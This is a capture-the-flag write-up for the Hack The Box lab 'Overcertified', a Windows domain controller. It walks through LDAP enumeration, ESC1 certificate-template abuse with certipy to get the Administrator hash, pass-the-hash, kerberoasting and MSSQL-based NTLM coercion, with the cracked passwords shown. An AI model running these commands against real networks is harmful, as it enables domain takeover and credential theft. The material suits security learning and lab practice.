# Overcertified

![alt text](image.png)

Overcertified is an easy windows box that is accessible through HTB Enterprise.

It's actually pretty interesting as some of the concepts outlined here are pretty realistic.

Let's dive in.

### Recon & Enumeration

Every good HTB Write up starts with very, very good recon. Mine does not. I'll miss some things here and will come back to some more recon later.

First, lets get some eyes.

#### Scan

```bash

┌──(kali㉿kali)-[~]
└─$ nmap 10.129.229.25 -T4 -A
Nmap scan report for 10.129.229.25
Host is up (0.36s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-18 17:11:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows 
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows 
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.229.25:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.229.25:1433: 
|     Target_Name: CERTIFIEDDC
|     NetBIOS_Domain_Name: CERTIFIEDDC
|     NetBIOS_Computer_Name: CERTIFIED
|     DNS_Domain_Name: certified.htb
|     DNS_Computer_Name: CERTIFIED.certified.htb
|     DNS_Tree_Name: certified.htb
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-18T16:53:23
|_Not valid after:  2055-05-18T16:53:23
|_ssl-date: 2025-05-18T17:13:22+00:00; +6h59m13s from scanner time.
3268/tcp open  ldap          Microsoft Windows 
3269/tcp open  ssl/ldap      Microsoft Windows 
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Host script results:
| smb2-time: 
|   date: 2025-05-18T17:12:41
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m12s, deviation: 0s, median: 6h59m11s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   385.98 ms 10.10.14.1
2   386.33 ms 10.129.229.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.83 seconds
                                                
```

Alright, we've got:

- DNS
- **Kerberos Auth (!)**
- RPC (!)
- **SMB (!)**
- **LDAP (!)**
- Kerberos Password Change
- More rpc
- LDAPS
- **MSSQL (!)**
- **WINRM (!)**

#### Enumerating

Now lets enumerate these services. First I set up responder, just in case.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0 -dw 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


<Insert yap here>

[+] Listening for events...                                                                                                                                 

```
Alright lets get cracking with some netexec.
```bash
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.229.25 -u 'guest' -p '' --shares                                                                
SMB         10.129.229.25   445    CERTIFIED        [*] Windows Server 2022 Build 20348 x64 (name:CERTIFIED) (domain:certified.htb) (signing:True) (SMBv1:False) 
SMB         10.129.229.25   445    CERTIFIED        [-] certified.htb\guest: STATUS_ACCOUNT_DISABLED 
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.229.25 -u 'anonymous' -p '' --shares 
SMB         10.129.229.25   445    CERTIFIED        [*] Windows Server 2022 Build 20348 x64 (name:CERTIFIED) (domain:certified.htb) (signing:True) (SMBv1:False) 
SMB         10.129.229.25   445    CERTIFIED        [-] certified.htb\anonymous: STATUS_LOGON_FAILURE 
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc ldap 10.129.229.25 -u 'anonymous' -p ''      

                    [-] Error reflecting tables for the LDAP protocol - this means there is a DB schema mismatch
                    [-] This is probably because a newer version of nxc is being run on an old DB schema
                    [-] Optionally save the old DB data (`cp /home/kali/.nxc/workspaces/default/ldap.db ~/nxc_ldap.bak`)
                    [-] Then remove the nxc LDAP DB (`rm -f /home/kali/.nxc/workspaces/default/ldap.db`) and run nxc to initialize the new DB
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ rm -f /home/kali/.nxc/workspaces/default/ldap.db
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc ldap 10.129.229.25 -u 'anonymous' -p ''     
[*] Initializing LDAP protocol database
LDAP        10.129.229.25   389    CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
LDAP        10.129.229.25   389    CERTIFIED        [-] certified.htb\anonymous: 
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc ldap 10.129.229.25 -u 'guest' -p ''     
LDAP        10.129.229.25   389    CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
LDAP        10.129.229.25   389    CERTIFIED        [-] certified.htb\guest: STATUS_ACCOUNT_DISABLED
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc ldap 10.129.229.25 -u '' -p ''      
LDAP        10.129.229.25   389    CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
LDAP        10.129.229.25   389    CERTIFIED        [+] certified.htb\: 
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.229.25 -u '' -p '' --shares 
SMB         10.129.229.25   445    CERTIFIED        [*] Windows Server 2022 Build 20348 x64 (name:CERTIFIED) (domain:certified.htb) (signing:True) (SMBv1:False) 
SMB         10.129.229.25   445    CERTIFIED        [+] certified.htb\: 
SMB         10.129.229.25   445    CERTIFIED        [-] Error enumerating shares: STATUS_ACCESS_DENIED


```
Hmmm, okay seems that we can do some stuff with LDAP.
```bash
┌──(kali㉿kali)-[~]
└─$ nxc ldap 10.129.229.25 -u '' -p '' -M user-desc
LDAP        10.129.229.25   389    CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
LDAP        10.129.229.25   389    CERTIFIED        [+] certified.htb\: 
USER-DESC   10.129.229.25   389    CERTIFIED        User: ldapusr - Description: Ldap Service Account Password: ldapisfun
USER-DESC   10.129.229.25   389    CERTIFIED        Saved 2 user descriptions to /home/kali/.nxc/logs/UserDesc-CERTIFIED.certified.htb-20250518_150831.log
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc ldap 10.129.229.25 -u '' -p '' -M get-userPassword
LDAP        10.129.229.25   389    CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
LDAP        10.129.229.25   389    CERTIFIED        [+] certified.htb\: 
GET-USER... 10.129.229.25   389    CERTIFIED        [+] Found following users: 
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc ldap 10.129.229.25 -u '' -p '' -M adcs            
LDAP        10.129.229.25   389    CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
LDAP        10.129.229.25   389    CERTIFIED        [+] certified.htb\: 
ADCS        10.129.229.25   389    CERTIFIED        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
                                                                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ nxc ldap 10.129.229.25 -u '' -p '' -M daclread
DACLREAD                                            [-] Select an option, example: -M daclread -o TARGET=Administrator ACTION=read
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc ldap 10.129.229.25 -u '' -p '' -M maq     
LDAP        10.129.229.25   389    CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
LDAP        10.129.229.25   389    CERTIFIED        [+] certified.htb\: 
MAQ         10.129.229.25   389    CERTIFIED        [*] Getting the MachineAccountQuota
MAQ         10.129.229.25   389    CERTIFIED        MachineAccountQuota: 10
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc ldap 10.129.229.25 -u '' -p '' -M pre2k
LDAP        10.129.229.25   389    CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
LDAP        10.129.229.25   389    CERTIFIED        [+] certified.htb\: 
PRE2K       10.129.229.25   389    CERTIFIED        [+] Successfully obtained TGT for 0 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/ccache
                                                                                                                                        
```

Okay, so not thats pretty lame. But... after checking that user descriptions we did find something. 

![alt text](<Screenshot from 2025-05-18 21-55-56.png>)

Heyyyy, there we go! We got a user account.

ldapusr:ldapisfun

Alright, I'm going to save you a bit of scrolling time. None of our other commands above were helped by this user account. Lets try some privilege escalation.

Lets start with my go-to Certipy-ad. Certipy is like having cheats codes. It is <ins>***nuts***</ins>.

```bash
┌──(kali㉿kali)-[~]
└─$ certipy-ad find -u ldapusr -p ldapisfun  -dc-ip 10.129.229.25
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'CERTIFIED-CA' via CSRA
[*] Got CA configuration for 'CERTIFIED-CA'
[*] Saved BloodHound data to '20250518163718_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250518163718_Certipy.txt'
[*] Saved JSON output to '20250518163718_Certipy.json'

```

In this case certipy gave us two awesome tools.

A) We've got a domain dump for bloodhound.

B) We found a vulnerable template.

There is a template named Auth that is vulnerable to privilege escalation straight to Domain Admin. All you need is a user with the correct enrollment permissions.

### Exploiting -> Pwning and then Exploiting -> Pwning again.

```
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\Domain Users
                                          CERTIFIED.HTB\Enterprise Read-only Domain Controllers
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Domain Controllers
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Authenticated Users
                                          CERTIFIED.HTB\Enterprise
```

```
Certificate Templates
  0
    Template Name                       : Auth
    Display Name                        : Auth
    Certificate Authorities             : CERTIFIED-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : SubjectAltRequireDomainDns
                                          EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : KDC Authentication
                                          Smart Card Logon
                                          Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\Domain Users
                                          CERTIFIED.HTB\Enterprise Read-only Domain Controllers
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Domain Controllers
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Authenticated Users
                                          CERTIFIED.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'CERTIFIED.HTB\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
```

Abusing the hell out of that certificate is now easy.


```bash
┌──(kali㉿kali)-[~]
└─$ certipy-ad account -u 'ldapusr' -p 'ldapisfun' -dc-ip 10.129.229.25 -user 'administrator' read     
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=certified,DC=htb
    name                                : Administrator
    objectSid                           : S-1-5-21-1150090003-2740091071-2719530230-500
    sAMAccountName                      : Administrator

┌──(kali㉿kali)-[~]
└─$ certipy-ad req \    
    -u 'ldapusr@certified.htb' -p 'ldapisfun' \
    -dc-ip '10.129.229.25' -target 'CERTIFIED.certified.htb' \
    -ca 'CERTIFIED-CA' -template 'Auth' \
    -upn 'administrator@certified.htb' -sid 'S-1-5-21-1150090003-2740091071-2719530230-500'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 19
[*] Got certificate with UPN 'administrator@certified.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

┌──(kali㉿kali)-[~]
└─$ sudo ntpdate 10.129.229.25                                                                            
[sudo] password for kali: 
2025-05-18 17:01:24.870218 (-0400) +911.207016 +/- 0.200149 10.129.229.25 s1 no-leap
CLOCK: time stepped by 911.207016
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.229.25'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:ee778b86e5fa6072152e9e8d498e740b


┌──(kali㉿kali)-[~]
└─$ impacket-smbclient 'administrator@10.129.229.25' -hashes aad3b435b51404eeaad3b435b51404ee:ee778b86e5fa6072152e9e8d498e740b
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# who
host:   \\10.10.14.22, user: administrator, active:     3, idle:     0

```
That was almost too easy. I actually think this was not the intended attack path. There's something interesting I noted about this server.

![alt text](image-1.png)

Lets ignore our cheat code for a minute.

When I first got access to that ldapusr, I tried something else. 

Kerberoasting.

```bash

┌──(kali㉿kali)-[~]
└─$ GetUserSPNs.py certified.htb/ldapusr:ldapisfun -dc-ip 10.129.229.25 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName         Name         MemberOf  PasswordLastSet             LastLogon                   Delegation 
---------------------------  -----------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/CERTIFIED.htb:1433  MSSQLSERVER            2023-01-12 00:15:26.374709  2023-01-12 00:17:39.341388             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*MSSQLSERVER$CERTIFIED.HTB$certified.htb/MSSQLSERVER*$2d901e78805a315c120f811b154ca618$31f55956be5fb1016e313fb0028a571e3716ca353403814a49c0cd55dca4f4285768958f791e2b2aa777b156f346e12d3ac0b5e45ed34bb5ccf3a6910705b1b977dd64715594b0abf2a0d596d15d2dfcf4fccffc275fc35efd7e31046bad5909ed13ae58d3fde50ce47d659ad5c7719e561d9b151c6cec2b534703c9c89aaa92b9958e4a09c72911334a625cbee260fc5db5c611edee1bbcf8136148aaec2a3bc6c299758d36956390c34bd827ac37c982b6d7568b8828cf1c3295ed159b5cda88be9ee3c9ba58315597d85250e7172fc911a0a4dc2fc3169509de54bc6e81c06b057cc78438233edbe38a43e74ff774e35f539bde556d54d7d03c665b0f1af11045c751ff1126ec73e84e0cf8640e76ce36f4ae248f25194ae5b8b0632b07e70eef19524f2190973bf6ab355efe30cd028453f91461b7f43bbc8024e989a48e80410cc4553ff309bd60e2f9b34c64183d4b03eb12ccf6fc11d8b2255855ea9948b3dc669f23201c5df89eb860cf80be4eecc0289d5afb422fb6cce1822494d9ed3f839905c622ffe5ab4e7b58f2fc476f00a1edcc78f3197cb5b38870862fee60be66a9139ed4f51314f666b350cd56858e132fb8d9a07caa57d45b15bdfeac843f67ddfa4c933b9b856a0cdcb1a78e20098f2dc02c9e3bad23e83ee4365efd4eafca7d7edb3d70d58b823bb7b92d3c7925dcf3a788df421ecf9c3feea7ed363f4826ecd8785c3445b76e30f2b2083aed21d01439657d8e4eaf93c4c1f4d098b2f81c7202cd9c9a35908f89c522fe06dbe8885e34a2a7f63491687cf2228c26220a673e704df09d428eef65db3cd26e5798dcf3b7aa3783a5cfb432219a838ce71267fe36b63964ca20e334f5da516b9d420aed1d2c67903d02f3fe7fc07d90cdb8eaf295dfcc7e5aae41f02c687bf33c0e246682318d3d140208ffc2c4aa257ab5a814f7d863a47882785d20de7294459301ff52ce4cbb3b74b6d924a52c30627a16d2ecaefdbf6e169b44d842c5d4fbe2041b38aac5dec0932c621c9a8847a49cdd152e1c8f64ef33baed703af9b4b81231bdb206e5aa922c167e88785c63474b9ece22a9eaa606ff4b62845e2e7ae9dd211374d80aef82058d26d562b60d21d4344a6a1fd31c4652cd6ed1861fee4bf5f9613feab90157f98ee4a64b0dd9bd95f86e25b35f2034ce4138fc26e6d8cb22796b56dc299e91772d8dfb7c42991cb59f575f625372ae5143f37c91ddd5d4e8d52ad8acd0129f118361d4a112fc871f4155cb7f18f9f13b8542225ffc460239155ff86a4da5013008e1a22c97232968e59d88fa4ee61c4543a836bd3e3dd80ccf8b07d46c794ff99700f0c84b5fa032a45d31c9afbdc7a343eb8d3167b62b76b20be1f1ff6f25b7bd6681

```
![alt text](image-2.png)


Lets get cracking! (Hashcat is the bugatti)

```bash

┌──(kali㉿kali)-[~]
└─$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 4800HS with Radeon Graphics, 2913/5891 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$krb5tgs$23$*MSSQLSERVER$CERTIFIED.HTB$certified.htb/MSSQLSERVER*$2d901e78805a315c120f811b154ca618$31f55956be5fb1016e313fb0028a571e3716ca353403814a49c0cd55dca4f4285768958f791e2b2aa777b156f346e12d3ac0b5e45ed34bb5ccf3a6910705b1b977dd64715594b0abf2a0d596d15d2dfcf4fccffc275fc35efd7e31046bad5909ed13ae58d3fde50ce47d659ad5c7719e561d9b151c6cec2b534703c9c89aaa92b9958e4a09c72911334a625cbee260fc5db5c611edee1bbcf8136148aaec2a3bc6c299758d36956390c34bd827ac37c982b6d7568b8828cf1c3295ed159b5cda88be9ee3c9ba58315597d85250e7172fc911a0a4dc2fc3169509de54bc6e81c06b057cc78438233edbe38a43e74ff774e35f539bde556d54d7d03c665b0f1af11045c751ff1126ec73e84e0cf8640e76ce36f4ae248f25194ae5b8b0632b07e70eef19524f2190973bf6ab355efe30cd028453f91461b7f43bbc8024e989a48e80410cc4553ff309bd60e2f9b34c64183d4b03eb12ccf6fc11d8b2255855ea9948b3dc669f23201c5df89eb860cf80be4eecc0289d5afb422fb6cce1822494d9ed3f839905c622ffe5ab4e7b58f2fc476f00a1edcc78f3197cb5b38870862fee60be66a9139ed4f51314f666b350cd56858e132fb8d9a07caa57d45b15bdfeac843f67ddfa4c933b9b856a0cdcb1a78e20098f2dc02c9e3bad23e83ee4365efd4eafca7d7edb3d70d58b823bb7b92d3c7925dcf3a788df421ecf9c3feea7ed363f4826ecd8785c3445b76e30f2b2083aed21d01439657d8e4eaf93c4c1f4d098b2f81c7202cd9c9a35908f89c522fe06dbe8885e34a2a7f63491687cf2228c26220a673e704df09d428eef65db3cd26e5798dcf3b7aa3783a5cfb432219a838ce71267fe36b63964ca20e334f5da516b9d420aed1d2c67903d02f3fe7fc07d90cdb8eaf295dfcc7e5aae41f02c687bf33c0e246682318d3d140208ffc2c4aa257ab5a814f7d863a47882785d20de7294459301ff52ce4cbb3b74b6d924a52c30627a16d2ecaefdbf6e169b44d842c5d4fbe2041b38aac5dec0932c621c9a8847a49cdd152e1c8f64ef33baed703af9b4b81231bdb206e5aa922c167e88785c63474b9ece22a9eaa606ff4b62845e2e7ae9dd211374d80aef82058d26d562b60d21d4344a6a1fd31c4652cd6ed1861fee4bf5f9613feab90157f98ee4a64b0dd9bd95f86e25b35f2034ce4138fc26e6d8cb22796b56dc299e91772d8dfb7c42991cb59f575f625372ae5143f37c91ddd5d4e8d52ad8acd0129f118361d4a112fc871f4155cb7f18f9f13b8542225ffc460239155ff86a4da5013008e1a22c97232968e59d88fa4ee61c4543a836bd3e3dd80ccf8b07d46c794ff99700f0c84b5fa032a45d31c9afbdc7a343eb8d3167b62b76b20be1f1ff6f25b7bd6681:lucky7
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*MSSQLSERVER$CERTIFIED.HTB$certified.ht...bd6681
Time.Started.....: Sun May 18 13:30:06 2025 (0 secs)
Time.Estimated...: Sun May 18 13:30:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    17194 H/s (2.64ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1
Hardware.Mon.#1..: Util: 26%
```

Alright, alright. So, lets ignore that certificate template for now. We have access to this MSSQL server. Lets see what we can do.

Lets enumerate this MSSQL account and what is it can do.

```bash
┌──(kali㉿kali)-[~]
└─$ nxc mssql 10.129.229.25 -u 'MSSQLSERVER' -p 'lucky7' -L    
LOW PRIVILEGE MODULES
[*] enum_impersonate          Enumerate users with impersonation privileges
[*] enum_logins               Enumerate SQL Server logins
[*] exec_on_link              Execute commands on a SQL Server linked server
[*] link_enable_xp            Enable or disable xp_cmdshell on a linked SQL server
[*] link_xpcmd                Run xp_cmdshell commands on a linked SQL server
[*] mssql_coerce              Execute arbitrary SQL commands on the target MSSQL server
[*] mssql_priv                Enumerate and exploit MSSQL privileges

HIGH PRIVILEGE MODULES (requires admin privs)
[*] empire_exec               Uses Empires RESTful API to generate a launcher for the specified listener and executes it
[*] enum_links                Enumerate linked SQL Servers and their login configurations.
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] test_connection           Pings a host
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
                                                                                                                                                                                                                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ nxc mssql 10.129.229.25 -u 'MSSQLSERVER' -p 'lucky7' -M mssql_priv
MSSQL       10.129.229.25   1433   CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
MSSQL       10.129.229.25   1433   CERTIFIED        [+] certified.htb\MSSQLSERVER:lucky7 
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc mssql 10.129.229.25 -u 'MSSQLSERVER' -p 'lucky7' -M nanodump  
[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
MSSQL       10.129.229.25   1433   CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
MSSQL       10.129.229.25   1433   CERTIFIED        [+] certified.htb\MSSQLSERVER:lucky7 
                                                                                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ nxc mssql 10.129.229.25 -u 'MSSQLSERVER' -p 'lucky7' -M enum_impersonate
MSSQL       10.129.229.25   1433   CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
MSSQL       10.129.229.25   1433   CERTIFIED        [+] certified.htb\MSSQLSERVER:lucky7 
ENUM_IMP... 10.129.229.25   1433   CERTIFIED        [-] No users with impersonation rights found.
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc mssql 10.129.229.25 -u 'MSSQLSERVER' -p 'lucky7' -x whoami          
MSSQL       10.129.229.25   1433   CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
MSSQL       10.129.229.25   1433   CERTIFIED        [+] certified.htb\MSSQLSERVER:lucky7 
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nxc mssql 10.129.229.25 -u 'MSSQLSERVER' -p 'lucky7' -M mssql_coerce -o L=10.10.14.22
MSSQL       10.129.229.25   1433   CERTIFIED        [*] Windows Server 2022 Build 20348 (name:CERTIFIED) (domain:certified.htb)
MSSQL       10.129.229.25   1433   CERTIFIED        [+] certified.htb\MSSQLSERVER:lucky7 
MSSQL_CO... 10.129.229.25   1433   CERTIFIED        [-] Failed to execute command: xp_fileexist '\\10.10.14.22\file';, Error: timed out
MSSQL_CO... 10.129.229.25   1433   CERTIFIED        [*] Commands executed successfully, check the listener for results
                                                                                                                                                    
```

Alright... fingers crossed. Lets check responder....


```bash

[SMB] NTLMv2-SSP Client   : 10.129.229.25
[SMB] NTLMv2-SSP Username : CERTIFIEDDC\thomas
[SMB] NTLMv2-SSP Hash     : thomas::CERTIFIEDDC:8332ddfafce5eb4f:133B9C37B80193768B01C03312012681:010100000000000080AA284C1AC8DB01467ABC1463E5B07C0000000002000800470037003100590001001E00570049004E002D004C00420045005100390059005200410059004900340004003400570049004E002D004C0042004500510039005900520041005900490034002E0047003700310059002E004C004F00430041004C000300140047003700310059002E004C004F00430041004C000500140047003700310059002E004C004F00430041004C000700080080AA284C1AC8DB010600040002000000080030003000000000000000000000000030000061B01F7990EF198FBBCAC5835D9AB9D64C2DE5811D6C3C117C768A5CA8377F510A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320032000000000000000000                                                                                        
```

UUUUEIIIIIIIII!!! Not too shabby... 

As you (probably don't) remember from earlier (I forgot too) SMB signing IS enabled on the DC, so we'll have to crack this hash again.

>Insert bugatti joke here

```bash


┌──(kali㉿kali)-[~]
└─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 4800HS with Radeon Graphics, 2913/5891 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

THOMAS::CERTIFIEDDC:19bbd5a81cad0f04:80d912fa52cf34971a3fdefea8f5ba8e:010100000000000000d71dbebbc7db0118b6dc0df06b147600000000020008004700320044004a0001001e00570049004e002d00310053004a004f005000560034003400450057004d0004003400570049004e002d00310053004a004f005000560034003400450057004d002e004700320044004a002e004c004f00430041004c00030014004700320044004a002e004c004f00430041004c00050014004700320044004a002e004c004f00430041004c000700080000d71dbebbc7db010600040002000000080030003000000000000000000000000030000061b01f7990ef198fbbcac5835d9ab9d64c2de5811d6c3c117c768a5ca8377f510a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320032000000000000000000:159357
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: THOMAS::CERTIFIEDDC:19bbd5a81cad0f04:80d912fa52cf34...000000
